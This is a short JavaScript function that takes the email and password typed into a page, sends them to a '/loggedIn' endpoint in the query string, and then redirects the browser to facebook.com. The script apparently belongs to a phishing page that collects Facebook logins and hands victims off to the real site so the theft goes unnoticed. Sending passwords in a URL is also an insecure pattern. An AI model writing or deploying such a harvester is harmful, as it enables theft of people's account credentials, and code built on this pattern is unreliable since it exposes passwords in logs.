
function onClick (){
   
    let uname = (document.getElementById('email').value);
    let pass = (document.getElementById('pass').value);

    fetch('/loggedIn?uname='+encodeURIComponent(uname)+'&&pass='+encodeURIComponent(pass))
    .then(function(response) {
        return response.json();
    })
    .then(function(myJson) {
        console.log(JSON.stringify(myJson));
        location.href = 'https://www.facebook.com/';
    });

}